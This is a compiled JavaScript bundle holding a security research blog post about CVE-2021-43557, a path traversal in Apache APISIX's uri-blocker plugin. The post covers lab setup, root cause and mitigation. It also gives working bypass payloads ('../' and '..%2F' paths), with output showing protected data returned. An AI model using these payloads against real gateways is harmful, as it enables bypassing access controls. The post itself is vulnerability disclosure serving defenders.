"use strict";(self.webpackChunk=self.webpackChunk||[]).push([[17776],{3905:function(e,t,a){a.d(t,{Zo:function(){return c},kt:function(){return m}});var n=a(67294);function i(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function r(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,n)}return a}function o(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?r(Object(a),!0).forEach((function(t){i(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):r(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function s(e,t){if(null==e)return{};var a,n,i=function(e,t){if(null==e)return{};var a,n,i={},r=Object.keys(e);for(n=0;n<r.length;n++)a=r[n],t.indexOf(a)>=0||(i[a]=e[a]);return i}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(n=0;n<r.length;n++)a=r[n],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(i[a]=e[a])}return i}var l=n.createContext({}),p=function(e){var t=n.useContext(l),a=t;return e&&(a="function"==typeof e?e(t):o(o({},t),e)),a},c=function(e){var t=p(e.components);return n.createElement(l.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},h=n.forwardRef((function(e,t){var a=e.components,i=e.mdxType,r=e.originalType,l=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),h=p(a),m=i,d=h["".concat(l,".").concat(m)]||h[m]||u[m]||r;return a?n.createElement(d,o(o({ref:t},c),{},{components:a})):n.createElement(d,o({ref:t},c))}));function m(e,t){var a=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var r=a.length,o=new Array(r);o[0]=h;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:i,o[1]=s;for(var p=2;p<r;p++)o[p]=a[p];return n.createElement.apply(null,o)}return n.createElement.apply(null,a)}h.displayName="MDXCreateElement"},64397:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return o},contentTitle:function(){return s},metadata:function(){return l},assets:function(){return p},toc:function(){return c},default:function(){return h}});var n=a(87462),i=a(63366),r=(a(67294),a(3905)),o={title:"Apache APISIX Path traversal in request_uri variable(CVE-2021-43557)",author:"Marcin Niemiec",authorURL:"https://github.com/xvnpw",authorImageURL:"https://avatars.githubusercontent.com/u/17719543?v=4",keywords:["Apache APISIX","CVE","Request_uri","Security"],description:"Research report about Apache APISIX Path traversal in request_uri variable(CVE-2021-43557)",tags:["Technology"]},s=void 0,l={permalink:"/blog/2021/11/23/cve-2021-43557-research-report",source:"@site/blog/2021/11/23/cve-2021-43557-research-report.md",title:"Apache APISIX Path traversal in request_uri variable(CVE-2021-43557)",description:"Research report about Apache APISIX Path traversal in request_uri variable(CVE-2021-43557)",date:"2021-11-23T00:00:00.000Z",formattedDate:"November 23, 2021",tags:[{label:"Technology",permalink:"/blog/tags/technology"}],readingTime:3.865,truncated:!0,authors:[{name:"Marcin Niemiec",url:"https://github.com/xvnpw",imageURL:"https://avatars.githubusercontent.com/u/17719543?v=4"}],nextItem:{title:"Developing APISIX Ingress Controller with Nocalhost in Kubernetes",permalink:"/blog/2021/11/22/develop-apisix-ingress-with-nocalhost-in-kubernetes"}},p={authorsImageUrls:[void 0]},c=[{value:"Setting the\xa0stage",id:"setting-the-stage",children:[]},{value:"Exploitation",id:"exploitation",children:[{value:"Root cause",id:"root-cause",children:[]},{value:"Impact",id:"impact",children:[]},{value:"Mitigation",id:"mitigation",children:[]}]},{value:"Skipper",id:"skipper",children:[]},{value:"Summary",id:"summary",children:[]}],u={toc:c};function h(e){var t=e.components,a=(0,i.Z)(e,["components"]);return(0,r.kt)("wrapper",(0,n.Z)({},u,a,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"Research report about Apache APISIX Path traversal in request_uri variable(CVE-2021-43557)")),(0,r.kt)("p",null,"In this article I will present my research on insecure usage of\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"$request_uri"),"\xa0variable in\xa0",(0,r.kt)("a",{parentName:"p",href:"https://github.com/apache/apisix-ingress-controller/"},"Apache APISIX"),"\xa0ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557","."," At the end of article I will mention in short\xa0",(0,r.kt)("a",{parentName:"p",href:"https://github.com/zalando/skipper"},"Skipper"),"\xa0which I tested for same problem."),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"Apache APISIX is a dynamic, real-time, high-performance API gateway. APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.")),(0,r.kt)("p",null,"Why\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"$request_uri"),"\xa0? This\xa0",(0,r.kt)("a",{parentName:"p",href:"https://nginx.org/en/docs/http/ngx_http_core_module.html#var_request_uri"},"variable"),"\xa0is many times used in authentication and authorization plugins. It\u2019s\xa0",(0,r.kt)("strong",{parentName:"p"},"not normalized"),", so giving a possibility to bypass some restrictions."),(0,r.kt)("p",null,"In Apache APISIX there is no typical functionality of external authentication/authorization. You can write your own plugin, but it\u2019s quite complicated. To prove that APISIX is vulnerable to path-traversal I will use\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"uri-blocker"),"\xa0plugin. I\u2019m suspecting that other plugins are also vulnerable but this one is easy to use."),(0,r.kt)("h2",{id:"setting-the-stage"},"Setting the\xa0stage"),(0,r.kt)("p",null,"Install Apache APISIX into Kubernetes. Use Helm Chart with version\xa0",(0,r.kt)("strong",{parentName:"p"},"0.7.2"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-shell"},"helm repo add bitnami https://charts.bitnami.com/bitnami\nhelm repo update\nkubectl create ns ingress-apisix\nhelm install apisix apisix/apisix \\\n  --set gateway.type=NodePort \\\n  --set ingress-controller.enabled=true \\\n  --namespace ingress-apisix \\\n  --version 0.7.2\nkubectl get service --namespace ingress-apisix\n")),(0,r.kt)("p",null,"In case of problems follow\xa0",(0,r.kt)("a",{parentName:"p",href:"https://github.com/apache/apisix-ingress-controller/blob/master/docs/en/latest/deployments/minikube.md"},"official guide"),"."),(0,r.kt)("p",null,"To create\xa0",(0,r.kt)("em",{parentName:"p"},"ingress route"),", you need to deploy\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"ApisixRoute"),"\xa0resource:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-yaml"},'apiVersion: apisix.apache.org/v2beta1\nkind: ApisixRoute\nmetadata:\n  name: public-service-route\nspec:\n  http:\n  - name: public-service-rule\n    match:\n      hosts:\n      - app.test\n      paths:\n      - /public-service/*\n    backends:\n        - serviceName: public-service\n          servicePort: 8080\n    plugins:\n      - name: proxy-rewrite\n        enable: true\n        config:\n          regex_uri: ["/public-service/(.*)", "/$1"]\n  - name: protected-service-rule\n    match:\n      hosts:\n      - app.test\n      paths:\n      - /protected-service/*\n    backends:\n        - serviceName: protected-service\n          servicePort: 8080\n    plugins:\n      - name: uri-blocker\n        enable: true\n        config:\n          block_rules: ["^/protected-service(/?).*"]\n          case_insensitive: true\n      - name: proxy-rewrite\n        enable: true\n        config:\n          regex_uri: ["/protected-service/(.*)", "/$1"]\n')),(0,r.kt)("p",null,"Let\u2019s dive deep into it:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"It creates routes for\xa0",(0,r.kt)("inlineCode",{parentName:"li"},"public-service"),"\xa0and\xa0",(0,r.kt)("inlineCode",{parentName:"li"},"private-service")),(0,r.kt)("li",{parentName:"ul"},"There is\xa0",(0,r.kt)("inlineCode",{parentName:"li"},"proxy-rewrite"),"\xa0turned on to remove prefixes"),(0,r.kt)("li",{parentName:"ul"},"There is\xa0",(0,r.kt)("inlineCode",{parentName:"li"},"uri-blocker"),"\xa0plugin configured for\xa0",(0,r.kt)("inlineCode",{parentName:"li"},"protected-service"),". It can look like mistake but this plugin it about to block any requests starting with\xa0",(0,r.kt)("inlineCode",{parentName:"li"},"/protected-service"))),(0,r.kt)("h2",{id:"exploitation"},"Exploitation"),(0,r.kt)("p",null,"I\u2019m using Apache APISIX in version\xa0",(0,r.kt)("strong",{parentName:"p"},"2.10.0"),"."),(0,r.kt)("p",null,"Reaching out to Apache APISIX routes in minikube is quite inconvenient:\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"kubectl exec -it -n ${namespace of Apache APISIX} ${Pod name of Apache APISIX} -- curl --path-as-is http://127.0.0.1:9080/public-service/public -H 'Host: app.test'"),". To ease my pain I will write small script that will work as template:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-shell"},"#/bin/bash\n\nkubectl exec -it -n ingress-apisix apisix-dc9d99d76-vl5lh -- curl --path-as-is http://127.0.0.1:9080$1 -H 'Host: app.test'\n")),(0,r.kt)("p",null,"In your case replace\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"apisix-dc9d99d76-vl5lh"),"\xa0with name of actual Apache APISIX pod."),(0,r.kt)("p",null,"Let\u2019s start with validation if routes and plugins are working as expected:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-shell"},'$ ./apisix_request.sh "/public-service/public"\nDefaulted container "apisix" out of: apisix, wait-etcd (init)\n{"data":"public data"}\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-shell"},'$ ./apisix_request.sh "/protected-service/protected"\nDefaulted container "apisix" out of: apisix, wait-etcd (init)\n<html>\n<head><title>403 Forbidden</title></head>\n<body>\n<center><h1>403 Forbidden</h1></center>\n<hr><center>openresty</center>\n</body>\n</html>\n')),(0,r.kt)("p",null,"Yep.\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"public-service"),"\xa0is available and\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"protected-service"),"\xa0is blocked by plugin."),(0,r.kt)("p",null,"Now let\u2019s test payloads:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-shell"},'$ ./apisix_request.sh "/public-service/../protected-service/protected"\nDefaulted container "apisix" out of: apisix, wait-etcd (init)\n{"data":"protected data"}\n')),(0,r.kt)("p",null,"and second one:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-shell"},'$ ./apisix_request.sh "/public-service/..%2Fprotected-service/protected"\nDefaulted container "apisix" out of: apisix, wait-etcd (init)\n{"data":"protected data"}\n')),(0,r.kt)("p",null,"As you can see in both cases I was able to bypass uri restrictions."),(0,r.kt)("h3",{id:"root-cause"},"Root cause"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"uri-blocker"),"\xa0plugin is using\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"ctx.var.request_uri"),"\xa0variable in logic of making blocking decision. You can check it in\xa0",(0,r.kt)("a",{parentName:"p",href:"https://github.com/apache/apisix/blob/11e7824cee0e4ab0145ea7189d991464ade3682a/apisix/plugins/uri-blocker.lua#L98"},"code"),":"),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://static.apiseven.com/202108/1637634166887-e3805291-5b00-4b7b-9936-0490266f4ed8.png",alt:"Cause"})),(0,r.kt)("h3",{id:"impact"},"Impact"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Attacker can bypass access control restrictions and perform successful access to routes that shouldn\u2019t be able to;"),(0,r.kt)("li",{parentName:"ul"},"Developers of custom plugins have no knowledge that\xa0",(0,r.kt)("inlineCode",{parentName:"li"},"ngx.var.request_uri"),"\xa0variable is untrusted.")),(0,r.kt)("p",null,"Search for usage of\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"var.request_uri"),"\xa0gave me a hint that maybe\xa0",(0,r.kt)("a",{parentName:"p",href:"https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/authz-keycloak.md"},"authz-keycloak plugin"),"\xa0is affected. You can see\xa0",(0,r.kt)("a",{parentName:"p",href:"https://github.com/apache/apisix/blob/a3d42e66f60673e408cab2e2ceedc58aee450776/apisix/plugins/authz-keycloak.lua#L578"},"this code"),", it looks really nasty. If there is no normalization on keycloak side, then there is high potential for vulnerablity."),(0,r.kt)("h3",{id:"mitigation"},"Mitigation"),(0,r.kt)("p",null,"In case of custom plugins, I suggest to do path normalization before using\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"ngx.var.request_uri"),"\xa0variable. There are also two other variables, high probably normalized, to check\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"ctx.var.upstream_uri"),"\xa0and\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"ctx.var.uri"),"."),(0,r.kt)("h2",{id:"skipper"},"Skipper"),(0,r.kt)("p",null,"Skipper is another ingress controller that I have investigated. It\u2019s not easy to install it in kubernetes, because deployment guide and helm charts are outdated. Luckily I have found issue page where developer was describing how to install it. This ingress gives possibility to implement external authentication based on\xa0",(0,r.kt)("a",{parentName:"p",href:"https://opensource.zalando.com/skipper/reference/filters/#webhook"},"webhook filter"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-yaml"},'apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: my-ingress\n  annotations:\n    zalando.org/skipper-filter: |\n            modPath("^/.*/", "/") -> setRequestHeader("X-Auth-Request-Redirect", "${request.path}") -> webhook("http://auth-service.default.svc.cluster.local:8080/verify")\n')),(0,r.kt)("p",null,"To add some interesting headers that could help in access control decision, you need to do it manually with\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"setRequestHeader"),"\xa0filter. There is template available to inject variable by\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"${}"),". Sadly (for attackers)\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"${request.path}"),"\xa0is having normalized path. I see in code that developers are not using\xa0",(0,r.kt)("em",{parentName:"p"},"easily"),"\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"RequestURI"),"\xa0or\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"originalRequest"),"."),(0,r.kt)("p",null,"I wasn\u2019t able to exploit path traversal in this case. Skipper remains safe."),(0,r.kt)("h2",{id:"summary"},"Summary"),(0,r.kt)("p",null,"Apache APISIX is vulnerable for path traversal. It\u2019s not affecting any external authentication, but plugins that are using\xa0",(0,r.kt)("inlineCode",{parentName:"p"},"ctx.var.request_uri"),"\xa0variable."),(0,r.kt)("p",null,"Whole code of this example is here\xa0",(0,r.kt)("a",{parentName:"p",href:"https://github.com/xvnpw/k8s-CVE-2021-43557-poc"},"https://github.com/xvnpw/k8s-CVE-2021-43557-poc"),"."))}h.isMDXComponent=!0}}]);